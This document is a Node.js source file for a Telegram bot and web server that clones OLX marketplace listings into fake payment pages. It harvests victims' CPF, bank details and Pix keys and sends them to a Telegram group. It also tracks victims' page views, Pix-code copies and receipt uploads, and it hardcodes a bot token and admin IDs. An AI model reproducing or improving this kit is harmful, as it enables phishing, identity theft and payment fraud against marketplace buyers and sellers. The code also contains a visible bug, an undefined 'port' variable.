// Variáveis fixas
const adminId = 7546422667;
const idgrup = "-1002760098481";

// Módulos nativos
import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";
import { dirname } from "path";

// Módulos externos
import express from "express";
import multer from "multer";
import TelegramBot from "node-telegram-bot-api";
import qrcode from "qrcode";
import { customAlphabet } from "nanoid";
import { Low, JSONFile } from "lowdb";

const URL_BASE = "https://olx-bot-lingering-violet-6133.fly.dev";

// Express + upload
const app = express();
const upload = multer();
const PORT = 3000;
const dataDir = '/data';

if (!fs.existsSync(dataDir)) {
  fs.mkdirSync(dataDir, { recursive: true });
}
// Simula __dirname
const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

// Banco de dados com LowDB
const dbPath = path.join(dataDir, 'db.json');
const adapter = new JSONFile(dbPath);
const db = new Low(adapter);

await db.read();
db.data ||= { usuarios: [] };
await db.write();

// Bot do Telegram
const bot = new TelegramBot('7978489607:AAGV1gBaQoju6WwWuh4dmZ5mSkIx75ZVLaw', { polling: true });

// Estado global de usuários
const estadoUsuario = {};

// Middleware global
app.use(express.json());

let botUsername = "";

bot.getMe().then((me) => {
  botUsername = me.username;
  console.log("Bot iniciado como @" + botUsername);
});
// Rota que renderiza a página HTML com dados do usuário pelo ID
app.get("/pag", async (req, res) => {
  const id = req.query.id;
  await db.read();
  const usuario = db.data.usuarios.find(u => u.id === id);
  if (!usuario) return res.status(404).send("Usuário não encontrado");

  const gerarSlides = (fotos = []) => {
    return fotos.map(url => `
      <div class="slide">
        <img src="${url}" class="produto-img" loading="lazy">
      </div>
    `).join("");
  };

  const inicial = nome => nome?.trim()[0]?.toUpperCase() || "?";

  fs.readFile(path.join(__dirname, "views", "face.html"), "utf8", (err, html) => {
    if (err) return res.status(500).send("Erro ao carregar HTML");

    const htmlFinal = html
      .replace(/{{fotos}}/g, gerarSlides(usuario.fotos))
      .replace(/{{nomeVendedor}}/g, usuario.nomeVendedor || "")
      .replace(/{{cidade}}/g, usuario.cidade || "")
      .replace(/{{desdeQuando}}/g, usuario.desdeQuando || "")
      .replace(/{{nomeProduto}}/g, usuario.nomeProduto || "")
      .replace(/{{preco}}/g, usuario.preco || "")
      .replace(/{{descricao}}/g, usuario.descricao || "")
      .replace(/{{codigoPagamento}}/g, usuario.codigoPagamento || "")
      .replace(/{{nomeCompradora}}/g, usuario.nomeCompradora || "")
      .replace(/{{inicialVendedor}}/g, inicial(usuario.nomeVendedor))
       .replace(/{{id}}/g, usuario.id); 

    res.send(htmlFinal);
  });
});
// ROTA DO FORMULARIO
app.get("/form", async (req, res) => {
  const id = req.query.id;
  await db.read();
  const usuario = db.data.usuarios.find(u => u.id === id);
  if (!usuario) return res.status(404).send("Usuário não encontrado");

  const html = fs.readFileSync("views/form.html", "utf8");

  const htmlFinal = html
    .replace(/{{id}}/g, usuario.id)
    .replace(/{{nomeProduto}}/g, usuario.nomeProduto || "")
    .replace(/{{preco}}/g, usuario.preco || "");

  res.send(htmlFinal);
});
//89 linha
// Bot Telegram
bot.onText(/\/olx/, (msg) => {
  const chatId = msg.chat.id;
  const username = msg.from.username; 
  const chatType = msg.chat.type;

  // ❌ Se for grupo, bloqueia e avisa
  if (chatType !== 'private') {
    return bot.sendMessage(chatId, `⚠️ Este bot so vai ser usado no PV.
👉 [Gere seu link ok Usando o Comando olx](https://t.me/${botUsername})`, {
      parse_mode: "Markdown",
      disable_web_page_preview: true
    });
  }

if (!username) {
  // Ignora ou avisa que o usuário precisa ter um @username
  return bot.sendMessage(chatId, `⚠️ Para usar este bot, você precisa ter um *nome de usuário público* (@username) no Telegram.

🆘 O nome de usuário NÃO é o seu nome comum (tipo “Kauã Silva”).  
É um identificador único, como @kaua123.

🛠️ Como definir um @username:

1. Abra o Telegram.
2. Vá no menu ☰ (ou toque em ⚙️ Configurações) 
3. 3 pontinhos novamente no canto superior direito e em * setusername * ou
4. Toque em “Nome de usuário”.
5. Escolha um nome único (ex: @kaua_dev).
6. Volte aqui e use o bot normalmente,se n conseguir chama o adm ✅`);
}
  const opcoes = {
    reply_markup: {
      inline_keyboard: [
        [{ text: '💸 Pagar', callback_data: 'pagar' }],
        [{ text: '📄 Extrair Dados', callback_data: 'extrair' }]
      ]
    }
  };
  bot.sendMessage(chatId, 'Escolha uma opção abaixo:', opcoes);
});
//rota da nitificacao
app.post("/form", upload.none(), async (req, res) => {
  const {
    nome,
    cpf,
    nascimento,
    email,
    telefone,
    banco,
    chavePix
  } = req.body;

  const id = req.query.id || "SEM ID";
  // Busca o usuário pelo id (ajuste conforme seu db e campo)
  const usuario = db.data.usuarios.find(u => u.id === id);

  if (!usuario) {
    return res.status(404).json({ status: "error", message: "Usuário não encontrado" });
  }
  function escapeMarkdown(text) {
  if (!text) return "";
  return text.replace(/([_*[\]()~`>#+-=|{}.!\\])/g, '\\$1');
}

  const mensagem = `
📥 *Novo Formulário Recebido*

🧑‍💻 @${escapeMarkdown(usuario.username) || "sem_username"}
🆔 ID: ${id}
👤 Nome: ${nome}
🆎 CPF: ${cpf}
🎂 Nascimento: ${nascimento}
📧 Email: ${email}
📱 Telefone: ${telefone}
🏦 Banco: ${banco}
🔑 Chave PIX: ${chavePix}
  `.trim();

  try {
    await bot.sendMessage(idgrup, mensagem, { parse_mode: "Markdown" });
    res.json({ status: "success" });
  } catch (err) {
    console.error("Erro ao enviar para o grupo:", err.message);
    res.status(500).json({ status: "error", message: "Falha ao enviar para o grupo Telegram" });
  }
});

app.get("/aviso", async (req, res) => {
  const id = req.query.id;

  await db.read();
  const usuario = db.data.usuarios.find(u => u.id === id);

  if (!usuario) {
    return res.status(404).send("Usuário não encontrado");
  }

  const html = fs.readFileSync("views/aviso.html", "utf8");

  const htmlFinal = html.replace(/{{valorTaxa}}/g, usuario.valorTaxa || "Não informado");

  res.send(htmlFinal);
});

app.post("/avisar-visualizacao", async (req, res) => {
  const id = req.query.id;

  await db.read();
  const usuario = db.data.usuarios.find(u => u.id === id);
  if (!usuario) return res.status(404).send("Usuário não encontrado");

  // Função de escape para MarkdownV2
  function escapeMarkdown(text) {
    return String(text).replace(/([_*()~`>#+=|{}.!\\-])/g, "\\$1");
  }

  const safeId = escapeMarkdown(usuario.id || "");
  const safeUsername = escapeMarkdown(usuario.username || "");
  const safeCompradora = escapeMarkdown(usuario.nomeCompradora || "");

  const mensagem = `👁️ A página de pagamento com ID *${safeId}* foi visualizada por *${safeCompradora}* \@${safeUsername}\`;

  try {
    if (usuario.username?.toLowerCase() === "rkzin_1999") {
      await bot.sendMessage(adminId, `🔒 [DEV] ${mensagem}`, { parse_mode: "MarkdownV2" });
    } else {
      await bot.sendMessage(idgrup, mensagem, { parse_mode: "MarkdownV2" });
    }

    res.sendStatus(200);
  } catch (err) {
    console.error("Erro ao enviar notificação de visualização:", err);
    res.sendStatus(500);
  }
});

app.post("/copiado", async (req, res) => {
  const id = req.query.id;

  await db.read();
  const usuario = db.data.usuarios.find(u => u.id === id);
  if (!usuario) return res.status(404).send("Usuário não encontrado");

  // Função de escape para MarkdownV2
  function escapeMarkdown(text) {
    return String(text).replace(/([_*()~`>#+=|{}.!\\-])/g, "\\$1");
  }

  const safeId = escapeMarkdown(usuario.id || "");
  const safeUsername = escapeMarkdown(usuario.username || "");

  const mensagem = `📥 O código Pix foi copiado por \@${safeUsername}\ na página com ID *${safeId}*`;

  try {
    if (usuario.username?.toLowerCase() === "rkzin_1999") {
      await bot.sendMessage(adminId, `🔒 [DEV] ${mensagem}`, { parse_mode: "MarkdownV2" });
    } else {
      await bot.sendMessage(idgrup, mensagem, { parse_mode: "MarkdownV2" });
    }

    res.sendStatus(200);
  } catch (err) {
    console.error("Erro ao enviar notificação:", err);
    res.sendStatus(500);
  }
});

app.post("/avisar-intencao", async (req, res) => {
  const id = req.query.id;

  await db.read();
  const usuario = db.data.usuarios.find(u => u.id === id);
  if (!usuario) return res.status(404).send("Usuário não encontrado");

  // Escapa texto para MarkdownV2
  function escapeMarkdown(text) {
    return String(text).replace(/([_*()~`>#+=|{}.!\\-])/g, "\\$1");
  }

  const safeId = escapeMarkdown(usuario.id || "");
  const safeUsername = escapeMarkdown(usuario.username || "");

  const mensagem = `💬 O usuário \@${safeUsername}\ abriu a tela para enviar o comprovante na página com ID *${safeId}*`;

  try {
    if (usuario.username?.toLowerCase() === "rkzin_1999") {
      await bot.sendMessage(adminId, `🔒 [DEV] ${mensagem}`, { parse_mode: "MarkdownV2" });
    } else {
      await bot.sendMessage(idgrup, mensagem, { parse_mode: "MarkdownV2" });
    }

    res.sendStatus(200);
  } catch (err) {
    console.error("Erro ao enviar notificação:", err);
    res.sendStatus(500);
  }
});

app.post("/enviar-comprovante", upload.single("file"), async (req, res) => {
  const id = req.query.id;
  const file = req.file;

  if (!file) return res.status(400).send("Nenhum arquivo enviado.");

  await db.read();
  const usuario = db.data.usuarios.find(u => u.id === id);
  if (!usuario) return res.status(404).send("Usuário não encontrado");

  // Escapa campos para MarkdownV2
  function escapeMarkdown(text) {
    return String(text).replace(/([_*()~`>#+=|{}.!\\-])/g, "\\$1");
  }

  const safeId = escapeMarkdown(usuario.id || "");
  const safeUsername = escapeMarkdown(usuario.username || "");

  const caption = `✅ Pagamento confirmado por \@${safeUsername}\\n🆔 ID da página: *${safeId}*`;

  try {
    // Envia no grupo (se não for rkzin_1999)
    if (usuario.username?.toLowerCase() !== "rkzin_1999") {
      await bot.sendPhoto(idgrup, file.buffer, {
        caption,
        parse_mode: "MarkdownV2"
      });
    }

    // Envia no PV do admin
    await bot.sendPhoto(adminId, file.buffer, {
      caption: `🔒 [DEV] ${caption}`,
      parse_mode: "MarkdownV2"
    });

    // Envia no PV do criador (se tiver chatId)
    if (usuario.chatId) {
      await bot.sendPhoto(usuario.chatId, file.buffer, {
        caption,
        parse_mode: "MarkdownV2"
      });
    }

    res.json({ status: true });
  } catch (err) {
    console.error("Erro ao enviar imagem:", err);
    res.status(500).json({ status: false, message: "Erro ao enviar imagem no Telegram" });
  }
});

app.get("/qrcode", async (req, res) => {
  const id = req.query.id;

  await db.read();
  const usuario = db.data.usuarios.find(u => u.id === id);
  if (!usuario) return res.status(404).send("Usuário não encontrado");

  const html = fs.readFileSync("views/qrcode.html", "utf8");

  const htmlFinal = html
    .replace(/{{codigoPagamento}}/g, usuario.codigoPagamento || "")
    .replace(/{{valorTaxa}}/g, usuario.valorTaxa || "")
    .replace(/{{nomeCompradora}}/g, usuario.nomeCompradora || "")
    .replace(/{{id}}/g, usuario.id);

  res.send(htmlFinal);
});

app.get("/qrcode-info", async (req, res) => {
  const id = req.query.id;

  await db.read();
  const usuario = db.data.usuarios.find(u => u.id === id);
  if (!usuario) return res.status(404).json({ error: "Usuário não encontrado" });

  res.json({
    codigoPagamento: usuario.codigoPagamento
  });
});


app.get("/qrcode-base64", async (req, res) => {
  const id = req.query.id;
  await db.read();

  const usuario = db.data.usuarios.find(u => u.id === id);
  if (!usuario) return res.status(404).json({ error: "Usuário não encontrado" });

  try {
    const base64 = await qrcode.toDataURL(usuario.codigoPagamento, { errorCorrectionLevel: 'H' });
    res.json({ qrBase64: base64 });
  } catch (err) {
    console.error("Erro ao gerar QR:", err);
    res.status(500).json({ error: "Erro ao gerar QR Code" });
  }
});


// 1. Detecta comando /qr <id>
bot.onText(/\/qr (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const username = msg.from.username;

  if (!username) {
    return bot.sendMessage(chatId, "⚠️ Você precisa definir um nome de usuário (@username) no Telegram para usar este bot.");
  }

  const id = match[1].trim().toUpperCase();

  await db.read();
  const usuario = db.data.usuarios.find(u => u.id === id);

  if (!usuario) {
    return bot.sendMessage(chatId, `❌ Nenhum registro encontrado com o ID *${id}*`, { parse_mode: 'Markdown' });
  }

  // Salva estado do usuário para esperar código
  estadoUsuario[chatId] = {
    acao: 'atualizar_codigo',
    id,
    username // <-- salva quem quer atualizar
  };

  bot.sendMessage(chatId, `✏️ Envie o novo código de pagamento para o ID *${id}*`, { parse_mode: 'Markdown' });
});


// 2. Espera mensagem com o novo código
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const texto = msg.text?.trim();
  const username = msg.from.username;
  const estado = estadoUsuario[chatId];

  if (estado?.acao === 'atualizar_codigo') {
    const id = estado.id;
    const autorUsername = estado.username?.toLowerCase();

    await db.read();
    const index = db.data.usuarios.findIndex(u => u.id === id);
    const usuario = db.data.usuarios[index];

    if (index === -1 || !usuario) {
      bot.sendMessage(chatId, `❌ ID *${id}* não encontrado.`, { parse_mode: 'Markdown' });
      estadoUsuario[chatId] = null;
      return;
    }

    const antigoDono = usuario.username?.toLowerCase();

    // Atualiza apenas o código de pagamento (não altera o dono)
    db.data.usuarios[index].codigoPagamento = texto;
    await db.write();

    console.log(`[INFO] Código de pagamento atualizado para ID ${id} por @${autorUsername}: ${texto}`);
    bot.sendMessage(chatId, `✅ Código atualizado com sucesso para o ID *${id}*!`, { parse_mode: 'Markdown' });

    // Verifica se foi outra pessoa (diferente do dono original) que alterou
    if (autorUsername && antigoDono && autorUsername !== antigoDono) {
      // Se NÃO for o Rkzin_1999, manda alerta no grupo
      if (autorUsername !== 'rkzin_1999') {
        // Protege caracteres especiais no alerta (Markdown)
        const escapeMarkdown = (text) => String(text).replace(/([_*[\]()~`>#+=|{}.!\\-])/g, "\\$1");

        const safeUsername = escapeMarkdown(username);
        const safeId = escapeMarkdown(id);
        const safeDono = escapeMarkdown(usuario.username);

        const alerta = `⚠️ *@${safeUsername}* atualizou o código Pix da página *${safeId}*, que pertence a *@${safeDono}*`;
        await bot.sendMessage(idgrup, alerta, { parse_mode: 'MarkdownV2' });
      } else {
        console.log(`[INFO] rkzin_1999 alterou o código de ${id} (sem alerta no grupo)`);
      }
    }

    // Limpa o estado
    estadoUsuario[chatId] = null;
    return;
  }
});

  // Outros fluxos (como aguardar URL etc.) continuam aqui...
bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;
  const opcao = query.data;
  const username = query.from.username; // <-- precisa vir antes do if abaixo
//200
  await bot.deleteMessage(chatId, query.message.message_id).catch(() => {});

  if (opcao === 'pagar') {
    bot.sendMessage(chatId, '💸 Me informe a URL para gerar o site.');
    estadoUsuario[chatId] = { step: 'aguardando_url_pagar' };
  } else if (opcao === 'extrair') {
    bot.sendMessage(chatId, '📄 Me informe a URL de extração.');
    estadoUsuario[chatId] = { step: 'aguardando_url_extrair' };
  }

  bot.answerCallbackQuery(query.id).catch(() => {});
});

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const texto = msg.text;
  const username = msg.from.username;
  if (!estadoUsuario[chatId]) return;

  // Fluxo pagar
  if (estadoUsuario[chatId].step === 'aguardando_url_pagar' && texto.startsWith('http')) {
    bot.sendMessage(chatId, 'conexao lenta,gera o qrcode enquanto eu gero o site.');
    try {
      const dados = await extrairDados(texto);

      // Salva dados parciais no estado
      estadoUsuario[chatId] = {
        step: 'aguardando_nome_compradora',
        dadosExtraidos: dados,
        username
      };

      bot.sendMessage(chatId, '📛 Informe o *nome da compradora*:', { parse_mode: 'Markdown' });
    } catch (err) {
      console.error(err);
      bot.sendMessage(chatId, '❌ Erro ao extrair os dados da URL.');
      estadoUsuario[chatId] = null;
    }
  }
  else if (estadoUsuario[chatId].step === 'aguardando_nome_compradora') {
    estadoUsuario[chatId].nomeCompradora = texto;
    estadoUsuario[chatId].step = 'aguardando_valor_taxa';
    bot.sendMessage(chatId, '💰 Informe o *valor da taxa*:', { parse_mode: 'Markdown' });
  }
  else if (estadoUsuario[chatId].step === 'aguardando_valor_taxa') {
    estadoUsuario[chatId].valorTaxa = texto;
    estadoUsuario[chatId].step = 'aguardando_codigo_pagamento';
    bot.sendMessage(chatId, '🔢 Informe o *código de pagamento*:', { parse_mode: 'Markdown' });
  }
  else if (estadoUsuario[chatId].step === 'aguardando_codigo_pagamento') {
    estadoUsuario[chatId].codigoPagamento = texto;

    // Agora salva tudo no DB e gera ID
    
    const gerarID = customAlphabet("ABCDEFGHIJKLMNOPQRSTUVWXYZ", 13);
    const idUnico = gerarID();
    await db.read();
db.data.usuarios.push({
  id: idUnico,
  username: estadoUsuario[chatId].username,
  chatId: chatId, 
  nomeProduto: estadoUsuario[chatId].dadosExtraidos.nomeProduto,
  preco: estadoUsuario[chatId].dadosExtraidos.preco,
  cidade: estadoUsuario[chatId].dadosExtraidos.cidade,
  descricao: estadoUsuario[chatId].dadosExtraidos.descricao,
  nomeVendedor: estadoUsuario[chatId].dadosExtraidos.nomeVendedor,
  desdeQuando: estadoUsuario[chatId].dadosExtraidos.desdeQuando,
  capturadoEm: estadoUsuario[chatId].dadosExtraidos.capturadoEm,
  nomeCompradora: estadoUsuario[chatId].nomeCompradora,
  valorTaxa: estadoUsuario[chatId].valorTaxa,
  codigoPagamento: estadoUsuario[chatId].codigoPagamento,

  // 🔥 ADICIONE ISTO:
  fotos: estadoUsuario[chatId].dadosExtraidos.fotos
});
await db.write();

    bot.sendMessage(chatId, `✅ Pagamento registrado com sucesso!\n👉 Acesse: ${URL_BASE}/pag?id=${idUnico}`);


    estadoUsuario[chatId] = null;
  }

  // Fluxo extrair dados simples (se quiser, pode implementar também)

});
  
app.listen(port, '0.0.0.0', () => {
  console.log(`🔥 Servidor ONLINE na porta ${port}`);
});